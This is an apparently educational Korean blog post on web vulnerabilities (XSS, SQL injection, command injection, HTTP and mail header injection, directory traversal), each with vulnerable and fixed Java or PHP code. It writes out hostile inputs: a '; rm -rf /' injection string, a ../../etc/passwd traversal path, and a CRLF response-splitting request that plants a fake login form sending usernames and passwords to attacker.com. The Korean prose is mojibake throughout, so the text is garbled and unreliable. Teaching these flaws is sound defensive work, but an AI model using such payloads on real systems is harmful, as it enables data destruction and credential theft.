---
title: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ì·¨ì•½ì  ë° ëŒ€ì‘ ë°©ë²•
excerpt: ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ í”íˆ ë°œìƒí•˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì ê³¼ ì´ì— ëŒ€í•œ ëŒ€ì‘ ë°©ë²•ì„ ì•Œì•„ë´…ë‹ˆë‹¤. XSS, SQL Injection, OS ì»¤ë§¨ë“œ ì¸ì ì…˜, HTTP í—¤ë” ì¸ì ì…˜, ë””ë ‰í† ë¦¬ ì ‘ê·¼ ê³µê²© ë“±ì„ ì¤‘ì ì ìœ¼ë¡œ ë‹¤ë£¹ë‹ˆë‹¤
categories: [What I Learned]
tags: [ì›¹ ë³´ì•ˆ, XSS, SQL Injection, OS ì»¤ë§¨ë“œ ì¸ì ì…˜, HTTP í—¤ë” ì¸ì ì…˜, ë””ë ‰í† ë¦¬ ì ‘ê·¼ ê³µê²©, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ]
image:
  path: /assets/img/wil/covers/xss.png
---

HTTP í”„ë¡œí† ì½œ ìì²´ëŠ” ë³µì¡í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— í”„ë¡œí† ì½œ ìì²´ë¡œ ê³µê²© ëŒ€ìƒì´ ë˜ëŠ” ê²½ìš°ëŠ” ì—†ìŠµë‹ˆë‹¤. ë°˜ë©´ì— ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì¸ì¦, ì„¸ì…˜ ê´€ë¦¬ ë“±ì˜ ê¸°ëŠ¥ì„ ê°œë°œìê°€ ì§ì ‘ ì„¤ê³„í•˜ê³  êµ¬í˜„í•˜ê¸° ë•Œë¬¸ì— ì·¨ì•½ì„±ì´ ë°œê²¬ë˜ëŠ” ê²½ìš°ê°€ ë§ìŠµë‹ˆë‹¤. HTTP ìš”ì²­ì— ê³µê²© ì½”ë“œë¥¼ ì‹¤ì–´ì„œ ì‹¤í–‰ë˜ëŠ” ê²½ìš°ë¥¼ ì˜ˆë¡œ ë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.


ê·¸ë ‡ë‹¤ë©´ ë³´ì•ˆ ì²´í¬ë¥¼ í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ í•´ë„ ê´œì°®ì„ê¹Œìš”? ê·¸ë ‡ì§€ ì•ŠìŠµë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì€ ì‰½ê²Œ ë³€ì¡°í•˜ê±°ë‚˜ ë¬´íš¨í™”ì‹œí‚¬ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ê·¼ë³¸ì ì¸ ë³´ì•ˆ ëŒ€ì±…ìœ¼ë¡œëŠ” ì í•©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í´ë¼ì´ì–¸íŠ¸ì¸¡ì—ì„œëŠ” ì…ë ¥ ì‹¤ìˆ˜ë¥¼ ì§€ì í•´ì£¼ëŠ” ì •ë„ë¡œ ì‚¬ìš©í•˜ê³ , ì‹¤ì§ˆì ì¸ ë³´ì•ˆ ì²˜ë¦¬ëŠ” ë°±ì—”ë“œì—ì„œ ì²˜ë¦¬í•˜ëŠ”ê²Œ ì¢‹ìŠµë‹ˆë‹¤. 


## ğŸ” í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… (XSS)
> ê³µê²©ìê°€ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì‚½ì…í•˜ì—¬ ì‚¬ìš©ì ë¸Œë¼ìš°ì €ì—ì„œ ì‹¤í–‰ë˜ë„ë¡ í•˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì 

1. ê³µê²©ìê°€ ê²Œì‹œê¸€ì„ ì‘ì„±í•  ë•Œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ ì…ë ¥.
	`<script>alert('XSS Attack!');</script>`
2. ì‚¬ìš©ìê°€ í•´ë‹¹ ê²Œì‹œê¸€ì— ì ‘ì†í•  ë•Œ ë§ˆë‹¤ ê²½ê³ ì°½ íŒì—…ì´ ë°œìƒ. 

## ğŸ” SQL Injection
> ê³µê²©ìì— ì˜í•´ ê°œë°œìê°€ ì˜ë„í•˜ì§€ ì•ŠëŠ” í˜•íƒœë¡œ SQL ë¬¸ì¥ì´ ë³€ê²½ë˜ì–´ êµ¬ì¡°ê°€ íŒŒê´´ë˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì 

ê²Œì‹œê¸€ì„ ê²€ìƒ‰í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤ê³  í•  ë•Œ 'bearsu'ë¥¼ ê²€ìƒ‰í•˜ë©´ URLê³¼ SQL ì¿¼ë¦¬ê°€ ë‹¤ìŒê³¼ ê°™ë‹¤ê³  í•´ë³´ê² ìŠµë‹ˆë‹¤.
```sql
http://bearsu.com/search?q=bearsu

SELECT title FROM article WHERE author='bearsu' and deleted=false;
```

í‚¤ì›Œë“œì— `--`ë¥¼ ì¶”ê°€í•˜ë©´ ì´í›„ì˜ ì¿¼ë¦¬ ë¬¸ì€ ì£¼ì„ ì²˜ë¦¬ê°€ ë©ë‹ˆë‹¤.
```sql
http://bearsu.com/search?q=bearsu--

// andì´í›„ë¡œ ëª¨ë‘ ì£¼ì„ ì²˜ë¦¬ëœë‹¤.
SELECT title FROM article WHERE author='bearsu--' and deleted=false;
```


## ğŸ” OS ì»¤ë§¨ë“œ ì¸ì ì…˜
> ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê²½ìœ í•˜ì—¬ ìš´ì˜ì²´ì œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì 

ë‹¤ìŒì€ ì‚¬ìš©ìë¡œë¶€í„° íŒŒì¼ ì´ë¦„ì„ ì…ë ¥ë°›ì•„ íŒŒì¼ ë‚´ìš©ì„ ì¶œë ¥í•˜ëŠ” ìë°” ì½”ë“œì…ë‹ˆë‹¤.
```java
public class CommandInjectionExample {
    public static void main(String[] args) {
        try {
            String filename = args[0]; // ì‚¬ìš©ì ì…ë ¥
            String command = "cat " + filename;
            Process process = Runtime.getRuntime().exec(command);

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

ë§Œì•½ ì‚¬ìš©ìê°€ ë‹¤ìŒê³¼ ê°™ì€ ì…ë ¥ì„ í•˜ë©´ ëª¨ë“  íŒŒì¼ì´ ì‚­ì œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
~~~bash
"; rm -rf /"
~~~

ì´ë¥¼ ë°©ì–´í•˜ê¸° ìœ„í•´ì„œ **ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ ëª…ë ¹ì–´ì— í¬í•¨ì‹œí‚¤ì§€ ë§ì•„ì•¼ í•©ë‹ˆë‹¤.**
~~~java
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class CommandInjectionPreventionExample {
    public static void main(String[] args) {

        try {
            String filename = args[0];
            // ì‚¬ìš©ì ì…ë ¥ ê²€ì¦
            if (!filename.matches("[a-zA-Z0-9._-]+")) {
                System.out.println("Invalid filename. Only alphanumeric characters, dots, underscores, and hyphens are allowed.");
                return;
            }

            // ì•ˆì „í•œ ë°©ì‹ìœ¼ë¡œ ëª…ë ¹ì–´ ì‹¤í–‰
            File file = new File(filename);
            if (!file.exists()) {
                System.out.println("File does not exist.");
                return;
            }

            ProcessBuilder processBuilder = new ProcessBuilder("cat", filename);
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~


## ğŸ” HTTP Header Injection
> HTTP ìš”ì²­ ë˜ëŠ” ì‘ë‹µ í—¤ë”ì— ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë™ì‘ì„ ë³€ê²½í•˜ê±°ë‚˜ ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì 

ë‹¤ìŒ ì½”ë“œëŠ” `user` íŒŒë¼ë¯¸í„°ë¥¼ ê·¸ëŒ€ë¡œ HTTP ì‘ë‹µ í—¤ë”ì— ì„¤ì •í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ê³µê²©ìê°€ `user` íŒŒë¼ë¯¸í„°ì— ì•…ì˜ì ì¸ ê°’ì„ ì‚½ì…í•˜ë©´ `í—¤ë” ì¸ì ì…˜`ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```java
public class HeaderInjectionServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String user = request.getParameter("user");
        response.setHeader("X-User", user);
        response.getWriter().println("Header set with user: " + user);
    }
}

```

í—¤ë”ì— ì„ì˜ì˜ ê°’ì´ ë“¤ì–´ê°€ë©´ ì–´ë–¤ ë¬¸ì œê°€ ì¼ì–´ë‚ ê¹Œìš”?

### HTTP ì‘ë‹µ ë¶„í• 
> ì…ë ¥ëœ ë°ì´í„°ê°€ HTTP ì‘ë‹µ í—¤ë”ì— í¬í•¨ë˜ì–´ ì‘ë‹µì´ ë‘ ê°œì˜ ë¶„ë¦¬ëœ HTTP ì‘ë‹µìœ¼ë¡œ ì²˜ë¦¬ë˜ë„ë¡ ìœ ë„í•˜ëŠ” ë°©ë²•

- ë¸Œë¼ìš°ì €ê°€ ë‘ ê°œì˜ ì‘ë‹µìœ¼ë¡œ í•´ì„í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë¸Œë¼ìš°ì €ì˜ ë™ì‘ì„ ì œì–´í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ëƒˆë‹¤ê³  í•´ë³´ê² ìŠµë‹ˆë‹¤.
```http
GET /someEndpoint HTTP/1.1 
Host: example.com 
X-User: attacker%0d%0aSet-Cookie:%20sessionId=malicious
```
- %0d%0aëŠ” URL ì¸ì½”ë”©ì—ì„œ ê°ê° ìºë¦¬ì§€ ë¦¬í„´(CR)ê³¼ ë¼ì¸ í”¼ë“œ(LF) ë¬¸ìë¥¼ ë‚˜íƒ€ë‚´ë©° CRLFëŠ” í—¤ë”ì˜ ëì„ ë‚˜íƒ€ë‚¸ë‹¤. ì¦‰, ì„œë²„ ì‘ë‹µì„ ë‘ ê°œì˜ ë¶„ë¦¬ëœ ì‘ë‹µìœ¼ë¡œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì‘ë‹µì´ ë¶„í• ë˜ë©´ ë¸Œë¼ìš°ì €ëŠ” ì²« ë²ˆì§¸ ì‘ë‹µì„ ì²˜ë¦¬í•˜ê³ , ì´í›„ì— ë‘ ë²ˆì§¸ ì‘ë‹µì„ ë³„ë„ ì²˜ë¦¬í•©ë‹ˆë‹¤.

< ì²« ë²ˆì§¸ ì‘ë‹µ > 
```http
HTTP/1.1 200 OK 
X-User: attacker
```

< ë‘ ë²ˆì§¸ ì‘ë‹µ >
```http
Set-Cookie: sessionId=malicious
Content-Type: text/html;charset=UTF-8

Header set with user: attacker
```

ë‘ ë²ˆì§¸ ì‘ë‹µì— ì•…ì„± ì½˜í…ì¸ ë¥¼ ì‚½ì…í•˜ì—¬ XSS ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```http
Injected-Header: InjectedValue 
Content-Type: text/html;charset=UTF-8 

<script>alert('XSS');</script>
```

ë˜ëŠ” ê°œí–‰ ë¬¸ì ë‘ ê°œë¥¼ ë‚˜ë€íˆ ë³´ëƒ„ìœ¼ë¡œì¨ í—¤ë”ì™€ ë°”ë””ë¥¼ ë‚˜ëˆ„ëŠ” ë¹ˆ í–‰ì„ ë§Œë“¤ì–´ ë‚´ê³  ê°€ì§œ ì›¹ í˜ì´ì§€ë¥¼ ë³´ì—¬ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
~~~http
GET /vulnerableServlet HTTP/1.1
Host: example.com
X-User: legitimateUser%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><body><h1>Login</h1><form method='POST' action='http://attacker.com/log'>Username: <input type='text' name='username'><br>Password: <input type='password' name='password'><br><input type='submit' value='Login'></form></body></html>

~~~

ì´ë¥¼ ë°©ì–´í•˜ê¸° ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì¦í•˜ê³  ì¸ì½”ë”©í•˜ì—¬ì•¼ í•©ë‹ˆë‹¤.
~~~java
public class SecureServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String user = request.getHeader("X-User");
        if (user != null) {
            user = StringEscapeUtils.escapeHtml4(user).replaceAll("[\r\n]", "");
        }
        response.setHeader("X-User", user);
        response.getWriter().println("Header set with user: " + user);
    }
}

~~~


### ë©”ì¼ í—¤ë” ì¸ì ì…˜
ë©”ì¼ í—¤ë”ë¥¼ ì¡°ì‘í•˜ê¸° ìœ„í•´ CRLF ë¬¸ìë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
~~~php
$to = "victim@example.com\r\nBcc: another@example.com";
$subject = "Hello";
$message = "This is a test email.";
$headers = "From: sender@example.com";

mail($to, $subject, $message, $headers);

~~~

ì´ë©”ì¼ì˜ í—¤ë”ëŠ” ì•„ë˜ì™€ ê°™ì´ ì¡°ì‘ë  ìˆ˜ ìˆë‹¤.
~~~
To: victim@example.com 
Bcc: another@example.com 
From: sender@example.com
~~~

ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ `\r` ë˜ëŠ” `\n` ì„ í¬í•¨í•˜ê³  ìˆëŠ”ì§€ í™•ì¸í•œ í›„ ë©”ì¼ì„ ì „ì†¡í•´ì•¼ í•œë‹¤.

ìë°”ì—ì„œëŠ” `JavaMailSender`ë¥¼ ì‚¬ìš©í•˜ë©´ ë©”ì¼ í—¤ë” ì¸ì ì…˜ì„ ë°©ì§€í•  ìˆ˜ ìˆìœ¼ë©°, @Email ì–´ë…¸í…Œì´ì…˜ì„ í†µí•´ ë©”ì¼ í˜•ì‹ì„ ê²€ì¦í•˜ëŠ” ë°©ì‹ìœ¼ë¡œë„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë””ë ‰í† ë¦¬ ì ‘ê·¼ ê³µê²©
> ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ ì„œë²„ì˜ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ì—ì„œ í—ˆê°€ë˜ì§€ ì•Šì€ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” ê³µê²©

~~~java
public class VulnerableDirectoryTraversal {

    public static void main(String[] args) {
        String basePath = "/var/www/html/files"; // ë² ì´ìŠ¤ ë””ë ‰í† ë¦¬
        String userInput = "../../etc/passwd"; // ì‚¬ìš©ì ì…ë ¥ íŒŒì¼ ì´ë¦„ (ê³µê²© ì‹œë„)

        File file = new File(basePath, userInput);

        // íŒŒì¼ ë‚´ìš©ì„ ì½ê³  ì¶œë ¥
        try {
            String content = new String(Files.readAllBytes(Paths.get(file.getPath())));
            System.out.println(content);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

~~~

ì´ë¥¼ ë°©ì–´í•˜ê¸° ìœ„í•´ ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì¦í•˜ê³  ê²½ë¡œë¥¼ ì •ê·œí™”í•˜ì—¬ì•¼ í•©ë‹ˆë‹¤.
~~~java
public class DirectoryTraversalProtection {

    public static boolean isSafePath(String basePath, String userInput) throws IOException {
        File base = new File(basePath);
        File file = new File(base, userInput);
        String canonicalBasePath = base.getCanonicalPath();
        String canonicalFilePath = file.getCanonicalPath();

        return canonicalFilePath.startsWith(canonicalBasePath);
    }

    public static void main(String[] args) {
        String basePath = "/var/www/html/files"; // ë² ì´ìŠ¤ ë””ë ‰í† ë¦¬
        String userInput = "../../etc/passwd"; // ì‚¬ìš©ì ì…ë ¥ íŒŒì¼ ì´ë¦„

        try {
            if (isSafePath(basePath, userInput)) {
                File file = new File(basePath, userInput);
                // íŒŒì¼ì„ ì•ˆì „í•˜ê²Œ ì²˜ë¦¬í•˜ëŠ” ì½”ë“œ ì‘ì„±
                System.out.println("File is safe to access: " + file.getCanonicalPath());
            } else {
                System.out.println("Unsafe file path detected!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

~~~

## ğŸ” ì°¸ê³ 
- ê·¸ë¦¼ìœ¼ë¡œ ë°°ìš°ëŠ” HTTP&NETWORK BASIC
- [Imperva XSS](https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/)
- [STACKHWAK Command Injection](https://www.stackhawk.com/blog/what-is-command-injection/)
- [Email Header Injection](https://www.acunetix.com/blog/articles/email-header-injection/)
- [Directory Traversal Attack](https://brightsec.com/blog/directory-traversal-attack/)


